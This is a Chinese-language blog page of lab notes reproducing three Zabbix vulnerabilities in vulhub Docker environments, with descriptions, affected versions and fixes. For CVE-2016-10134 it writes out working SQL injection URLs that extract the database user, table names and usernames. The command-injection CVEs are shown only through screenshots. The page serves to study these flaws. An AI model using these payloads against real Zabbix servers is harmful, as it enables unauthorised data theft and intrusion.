@@ -1,0 +1,476 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <meta name="description" content="si1ent">
+  <meta name="keyword" content="hexo-theme, vuejs">
+  
+    <link rel="shortcut icon" href="/css/images/logo.png">
+  
+  <title>
+    
+      Zabbix | si1ent
+    
+  </title>
+  <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/css/plugins/gitment.css">
+
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/geopattern/1.2.3/js/geopattern.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>
+  
+    
+<script src="/js/qrious.js"></script>
+
+  
+  
+    
+<script src="/js/gitment.js"></script>
+
+  
+  
+  
+    <!-- MathJax support START -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <!-- MathJax support END -->
+  
+
+
+  
+<meta name="generator" content="Hexo 5.2.0"></head>
+<div class="wechat-share">
+  <img src="/css/images/logo.png" />
+</div>
+
+  <body>
+    <header class="header fixed-header">
+  <div class="header-container">
+    <a class="home-link" href="/">
+      <div class="logo"></div>
+      <span>si1ent</span>
+    </a>
+    <ul class="right-list">
+      
+        <li class="list-item">
+          
+            <a href="/" class="item-link">Home</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/tags/" class="item-link">Tags</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/archives/" class="item-link">Archives</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/about/" class="item-link">About</a>
+          
+        </li>
+      
+    </ul>
+    <div class="menu">
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+    </div>
+    <div class="menu-mask">
+      <ul class="menu-list">
+        
+          <li class="menu-item">
+            
+              <a href="/" class="menu-link">Home</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/tags/" class="menu-link">Tags</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/archives/" class="menu-link">Archives</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/about/" class="menu-link">About</a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</header>
+
+    <div id="article-banner">
+  <h2>Zabbix</h2>
+  <p class="post-date">2021-04-20</p>
+  <div class="arrow-down">
+    <a href="javascript:;"></a>
+  </div>
+</div>
+<main class="app-body flex-box">
+  <!-- Article START -->
+  <article class="post-article">
+    <section class="markdown-content"><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>zabbix（[`zæbiks]）是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。</p>
+<p>zabbix能监视各种网络参数，保证服务器系统的安全运营；并提供灵活的通知机制以让系统管理员快速定位/解决存在的各种问题。</p>
+<p>zabbix由2部分构成，zabbix server与可选组件zabbix agent。</p>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/zabbix/">docker</a></p>
+<h3 id="漏洞实战分类"><a href="#漏洞实战分类" class="headerlink" title="漏洞实战分类"></a>漏洞实战分类</h3><h4 id="CVE-2016-10134"><a href="#CVE-2016-10134" class="headerlink" title="CVE-2016-10134"></a>CVE-2016-10134</h4><h5 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>zabbix是一款服务器监控软件，其由server、agent、web等模块组成，其中web模块由PHP编写，用来显示数据库中的结果。</p>
+<p>攻击者无需授权登陆即可登陆zabbix管理系统，进入后台后script等功能直接获取zabbix服务器的操作系统权限。</p>
+<h5 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h5><p>zabbix 2.2.x, 3.0.0-3.0.3</p>
+<h5 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>攻击者无需授权登陆即可登陆zabbix管理系统，进入后台后script等功能直接获取zabbix服务器的操作系统权限。</p>
+<h5 id="漏洞条件"><a href="#漏洞条件" class="headerlink" title="漏洞条件"></a>漏洞条件</h5><p>zabbix 2.2.x, 3.0.0-3.0.3</p>
+<h5 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><p>1、URL访问</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.20.120:8080&#x2F;index.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Zabbix/image-20210416204021332.png" alt="image-20210416204021332"></p>
+<p>2、guest账号登录</p>
+<p>（密码为空）</p>
+<p><img src="/images/Zabbix/image-20210416204235856.png" alt="image-20210416204235856"></p>
+<p>3、查看cookie的zbx_session</p>
+<p>复制后16位字符</p>
+<p>4、将这16个字符作为sid的值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.20.120:8080&#x2F;latest.php?output&#x3D;ajax&amp;sid&#x3D;d973662317b7d811&amp;favobj&#x3D;toggle&amp;toggle_open_state&#x3D;1&amp;toggle_ids[]&#x3D;updatexml(0,concat(0xa,user()),0)</span><br></pre></td></tr></table></figure>
+
+<p>5、访问</p>
+<p><img src="/images/Zabbix/image-20210419102735833.png" alt="image-20210419102735833"></p>
+<p>6、此漏洞也可以通过jsrpc.php触发</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.20.120:8080&#x2F;jsrpc.php?type&#x3D;0&amp;mode&#x3D;1&amp;method&#x3D;screen.get&amp;profileIdx&#x3D;web.item.graph&amp;resourcetype&#x3D;17&amp;profileIdx2&#x3D;updatexml(0,concat(0xa,user()),0)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Zabbix/image-20210419103048419.png" alt="image-20210419103048419"></p>
+<p>7、爆破其他表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.20.120:8080&#x2F;jsrpc.php?type&#x3D;0&amp;mode&#x3D;1&amp;method&#x3D;screen.get&amp;profileIdx&#x3D;web.item.graph&amp;resourcetype&#x3D;17&amp;profileIdx2&#x3D;updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;&#39;zabbix&#39; limit 0,1),0x7e),1)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Zabbix/image-20210419104936380.png" alt="image-20210419104936380"></p>
+<p>8、字段名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.20.120:8080&#x2F;jsrpc.php?type&#x3D;0&amp;mode&#x3D;1&amp;method&#x3D;screen.get&amp;profileIdx&#x3D;web.item.graph&amp;resourcetype&#x3D;17&amp;profileIdx2&#x3D;updatexml(1,concat(0x7e,(select username from zabbix.users limit 0,1),0x7e),1)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Zabbix/image-20210419105310351.png" alt="image-20210419105310351"></p>
+<h5 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>1、版本更新</p>
+<h4 id="CVE-2017-2824"><a href="#CVE-2017-2824" class="headerlink" title="CVE-2017-2824"></a>CVE-2017-2824</h4><h5 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>Zabbix 2.4.x中的trapper command功能存在一处代码执行漏洞，特定的数据包可造成命令注入，进而远程执行代码，攻击者可以从一个Zabbix proxy发起请求从而促发漏洞。</p>
+<h5 id="影响范围-1"><a href="#影响范围-1" class="headerlink" title="影响范围"></a>影响范围</h5><p>Zabbix 2.4.7 – 2.4.8r1</p>
+<h5 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>Zabbix 2.4.x中的trapper command功能存在一处代码执行漏洞，特定的数据包可造成命令注入，进而远程执行代码，攻击者可以从一个Zabbix proxy发起请求从而促发漏洞。</p>
+<h5 id="漏洞条件-1"><a href="#漏洞条件-1" class="headerlink" title="漏洞条件"></a>漏洞条件</h5><p>开启注册功能。</p>
+<h5 id="漏洞检测-1"><a href="#漏洞检测-1" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><p>1、自动注册功能开启</p>
+<p>利用该漏洞，需要你服务端开启了自动注册功能，所以我们先以管理员的身份开启自动注册功能。使用账号密码<code>admin/zabbix</code>登录后台，进入Configuration-&gt;Actions，将Event source调整为Auto registration，然后点击Create action，创建一个Action，名字随意：</p>
+<p><img src="/images/Zabbix/image-20210419111819662.png" alt="image-20210419111819662"></p>
+<p><img src="/images/Zabbix/image-20210419111958550.png" alt="image-20210419111958550"></p>
+<p><img src="/images/Zabbix/image-20210419112028632.png" alt="image-20210419112028632"></p>
+<p>以上完成自动注册开启</p>
+<p>2、 执行exp时一定确保<code>服务均已启动</code></p>
+<p><img src="/images/Zabbix/image-20210420115914003.png" alt="image-20210420115914003"></p>
+<center>服务均已启动</center>
+
+<p>3、执行exp，如果执行出现如下结果，可尝试多次执行。</p>
+<p><img src="/images/Zabbix/image-20210420140454038.png" alt="image-20210420140454038"></p>
+<p>4、如下命令执行成功</p>
+<p><img src="/images/Zabbix/image-20210420140614266.png" alt="image-20210420140614266"></p>
+<h5 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>1、除Zabbix Server 2.4.X版本以外不受影响</p>
+<p>2、通过删除ZabbixServer的Zabbix数据库内的三个默认脚本条目，攻击者将无法实际执行代码，即使他们可以将具有欺骗地址的主机插入到数据库中。</p>
+<p>操作如下：</p>
+<p>直接从数据库中利用命令消除（use zabbix; delete * from scripts;）<br>或从GUI界面通过操作（Administration -&gt; Scripts -&gt; Checkmarks -&gt; Delete Selected/Go）完成。</p>
+<h5 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;talosintelligence.com&#x2F;reports&#x2F;TALOS-2017-0325</span><br><span class="line">https:&#x2F;&#x2F;developer.aliyun.com&#x2F;article&#x2F;205794</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub&#x2F;tree&#x2F;master&#x2F;zabbix&#x2F;CVE-2017-2824</span><br></pre></td></tr></table></figure>
+
+<h4 id="CVE-2020-11800"><a href="#CVE-2020-11800" class="headerlink" title="CVE-2020-11800"></a>CVE-2020-11800</h4><h5 id="漏洞描述-2"><a href="#漏洞描述-2" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>Zabbix 是由Alexei Vladishev 开发的一种网络监视、管理系统，基于 Server-Client 架构。在CVE-2017-2824中，其Server端 trapper command 功能存在一处代码执行漏洞，而修复补丁并不完善，导致可以利用IPv6进行绕过，注入任意命令。</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8991">参考</a></p>
+<h5 id="影响范围-2"><a href="#影响范围-2" class="headerlink" title="影响范围"></a>影响范围</h5><p>Zabbix 3.0.x~3.0.30</p>
+<h5 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>该漏洞原理与CVE-2017-2824相同.</p>
+<p>active checks是自动注册的命令字，自动注册的本意是agent可主动将主机注册给server进行监控，在2.2.18版本中可以在IP中注入（参见上文的版本分析处，2.2.19版本才增加了ip校验）shell命令。CVE-2017-2824提到的漏洞在discovery data命令字即自动发现功能中，由于没有校验IP，导致可在IP中写入shell命令，进而在执行script cmd时达到命令注入。</p>
+<h5 id="漏洞条件-2"><a href="#漏洞条件-2" class="headerlink" title="漏洞条件"></a>漏洞条件</h5><p>Zabbix 3.0.x~3.0.30</p>
+<p>自动注册功能开启</p>
+<h5 id="漏洞检测-2"><a href="#漏洞检测-2" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><p>1、环境</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/zabbix/CVE-2020-11800">docker环境配置</a></p>
+<p>确保主机均已启动完成</p>
+<p><img src="/images/Zabbix/image-20210420142204565.png" alt="image-20210420142204565"></p>
+<p>2、URL访问</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.20.120:8080&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Zabbix/image-20210420141923721.png" alt="image-20210420141923721"></p>
+<p>3、开启自动注册功能</p>
+<p><img src="/images/Zabbix/image-20210420142032603.png" alt="image-20210420142032603"></p>
+<p><img src="/images/Zabbix/image-20210420142102116.png" alt="image-20210420142102116"></p>
+<p>4、执行exp尝试执行命令</p>
+<p><img src="/images/Zabbix/image-20210420142542115.png" alt="image-20210420142542115"></p>
+<p>5、获取tmp目录信息</p>
+<p><img src="/images/Zabbix/image-20210420142610446.png" alt="image-20210420142610446"></p>
+<h5 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>1、IP地址限制</p>
+<h5 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;8991</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+</section>
+    <!-- Tags START -->
+    
+      <div class="tags">
+        <span>Tags:</span>
+        
+  <a href="/tags#Zabbix" >
+    <span class="tag-code">Zabbix</span>
+  </a>
+
+      </div>
+    
+    <!-- Tags END -->
+    <!-- NAV START -->
+    
+  <div class="nav-container">
+    <!-- reverse left and right to put prev and next in a more logic postition -->
+    
+      <a class="nav-left" href="/2021/03/25/Solr%E6%BC%8F%E6%B4%9E/">
+        <span class="nav-arrow">← </span>
+        
+          Solr漏洞学习
+        
+      </a>
+    
+    
+      <a class="nav-right" href="/2021/05/06/Laravel/">
+        
+          Laravel
+        
+        <span class="nav-arrow"> →</span>
+      </a>
+    
+  </div>
+
+    <!-- NAV END -->
+    <!-- 打赏 START -->
+    
+      <div class="money-like">
+        <div class="reward-btn">
+          赏
+          <span class="money-code">
+            <span class="alipay-code">
+              <div class="code-image"></div>
+              <b>使用支付宝打赏</b>
+            </span>
+            <span class="wechat-code">
+              <div class="code-image"></div>
+              <b>使用微信打赏</b>
+            </span>
+          </span>
+        </div>
+        <p class="notice">若你觉得我的文章对你有帮助，欢迎点击上方按钮对我打赏</p>
+      </div>
+    
+    <!-- 打赏 END -->
+    <!-- 二维码 START -->
+    
+      <div class="qrcode">
+        <canvas id="share-qrcode"></canvas>
+        <p class="notice">扫描二维码，分享此文章</p>
+      </div>
+    
+    <!-- 二维码 END -->
+    
+      <!-- Gitment START -->
+      <div id="comments"></div>
+      <!-- Gitment END -->
+    
+  </article>
+  <!-- Article END -->
+  <!-- Catalog START -->
+  
+    <aside class="catalog-container">
+  <div class="toc-main">
+    <strong class="toc-title">Catalog</strong>
+    
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">概述</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">环境搭建</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98%E5%88%86%E7%B1%BB"><span class="toc-nav-number">3.</span> <span class="toc-nav-text">漏洞实战分类</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#CVE-2016-10134"><span class="toc-nav-number">3.1.</span> <span class="toc-nav-text">CVE-2016-10134</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="toc-nav-number">3.1.1.</span> <span class="toc-nav-text">漏洞描述</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="toc-nav-number">3.1.2.</span> <span class="toc-nav-text">影响范围</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-nav-number">3.1.3.</span> <span class="toc-nav-text">漏洞原理</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%9D%A1%E4%BB%B6"><span class="toc-nav-number">3.1.4.</span> <span class="toc-nav-text">漏洞条件</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B"><span class="toc-nav-number">3.1.5.</span> <span class="toc-nav-text">漏洞检测</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-nav-number">3.1.6.</span> <span class="toc-nav-text">漏洞修复</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#CVE-2017-2824"><span class="toc-nav-number">3.2.</span> <span class="toc-nav-text">CVE-2017-2824</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-1"><span class="toc-nav-number">3.2.1.</span> <span class="toc-nav-text">漏洞描述</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-1"><span class="toc-nav-number">3.2.2.</span> <span class="toc-nav-text">影响范围</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-1"><span class="toc-nav-number">3.2.3.</span> <span class="toc-nav-text">漏洞原理</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%9D%A1%E4%BB%B6-1"><span class="toc-nav-number">3.2.4.</span> <span class="toc-nav-text">漏洞条件</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-1"><span class="toc-nav-number">3.2.5.</span> <span class="toc-nav-text">漏洞检测</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-1"><span class="toc-nav-number">3.2.6.</span> <span class="toc-nav-text">漏洞修复</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%8F%82%E8%80%83"><span class="toc-nav-number">3.2.7.</span> <span class="toc-nav-text">参考</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#CVE-2020-11800"><span class="toc-nav-number">3.3.</span> <span class="toc-nav-text">CVE-2020-11800</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-2"><span class="toc-nav-number">3.3.1.</span> <span class="toc-nav-text">漏洞描述</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4-2"><span class="toc-nav-number">3.3.2.</span> <span class="toc-nav-text">影响范围</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-2"><span class="toc-nav-number">3.3.3.</span> <span class="toc-nav-text">漏洞原理</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%9D%A1%E4%BB%B6-2"><span class="toc-nav-number">3.3.4.</span> <span class="toc-nav-text">漏洞条件</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-2"><span class="toc-nav-number">3.3.5.</span> <span class="toc-nav-text">漏洞检测</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-2"><span class="toc-nav-number">3.3.6.</span> <span class="toc-nav-text">漏洞修复</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E5%8F%82%E8%80%83-1"><span class="toc-nav-number">3.3.7.</span> <span class="toc-nav-text">参考</span></a></li></ol></li></ol></li></ol>
+    
+  </div>
+</aside>
+
+  
+  <!-- Catalog END -->
+</main>
+
+<script>
+  (function () {
+    var url = 'http://example.com/2021/04/20/Zabbix/';
+    var banner = ''
+    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
+      $('#article-banner').css({
+        'background-image': 'url(' + banner + ')'
+      })
+    } else {
+      $('#article-banner').geopattern(url)
+    }
+    $('.header').removeClass('fixed-header')
+
+    // error image
+    $(".markdown-content img").on('error', function() {
+      $(this).attr('src', 'http://www.si1ent.xyz/css/images/logo.png')
+      $(this).css({
+        'cursor': 'default'
+      })
+    })
+
+    // zoom image
+    $(".markdown-content img").on('click', function() {
+      var src = $(this).attr('src')
+      if (src !== 'http://www.si1ent.xyz/css/images/logo.png') {
+        var imageW = $(this).width()
+        var imageH = $(this).height()
+
+        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
+        zoom = zoom < 1 ? 1 : zoom
+        zoom = zoom > 2 ? 2 : zoom
+        var transY = (($(window).height() - imageH) / 2).toFixed(2)
+
+        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
+        $('.image-view-wrap').addClass('wrap-active')
+        $('.image-view-wrap img').css({
+          'width': `${imageW}`,
+          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
+        })
+        $('html').css('overflow', 'hidden')
+
+        $('.image-view-wrap').on('click', function() {
+          $(this).remove()
+          $('html').attr('style', '')
+        })
+      }
+    })
+  })();
+</script>
+
+
+  <script>
+    var qr = new QRious({
+      element: document.getElementById('share-qrcode'),
+      value: document.location.href
+    });
+  </script>
+
+
+
+  <script>
+    var gitmentConfig = "si1ent";
+    if (gitmentConfig !== 'undefined') {
+      var gitment = new Gitment({
+        id: "Zabbix",
+        owner: "si1ent",
+        repo: "",
+        oauth: {
+          client_id: "",
+          client_secret: ""
+        },
+        theme: {
+          render(state, instance) {
+            const container = document.createElement('div')
+            container.lang = "en-US"
+            container.className = 'gitment-container gitment-root-container'
+            container.appendChild(instance.renderHeader(state, instance))
+            container.appendChild(instance.renderEditor(state, instance))
+            container.appendChild(instance.renderComments(state, instance))
+            container.appendChild(instance.renderFooter(state, instance))
+            return container;
+          }
+        }
+      })
+      gitment.render(document.getElementById('comments'))
+    }
+  </script>
+
+
+
+
+    <div class="scroll-top">
+  <span class="arrow-icon"></span>
+</div>
+    <footer class="app-footer">
+  <p class="copyright">
+    &copy; 2022 | Proudly powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+    <br>
+    </p>
+    <a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/?spm=a2c4g.11186623.J_9220772140.115.26b47b3dkZ3BnL#/Integrated/index"><p class="copyright">
+    皖ICP备19004273号-1
+  </p>
+    </a>
+</footer>
+<script>
+  function async(u, c) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+</script>
+<script>
+  async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
+    FastClick.attach(document.body);
+  })
+</script>
+
+<script>
+  var hasLine = 'true';
+  async("//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js", function(){
+    $('figure pre').each(function(i, block) {
+      var figure = $(this).parents('figure');
+      if (hasLine === 'false') {
+        figure.find('.gutter').hide();
+      }
+      var lang = figure.attr('class').split(' ')[1] || 'code';
+      var codeHtml = $(this).html();
+      var codeTag = document.createElement('code');
+      codeTag.className = lang;
+      codeTag.innerHTML = codeHtml;
+      $(this).attr('class', '').empty().html(codeTag);
+      figure.attr('data-lang', lang.toUpperCase());
+      hljs.highlightBlock(block);
+    });
+  })
+</script>
+<!-- Baidu Tongji -->
+
+
+<script src="/js/script.js"></script>
+
+
+  </body>
+</html>
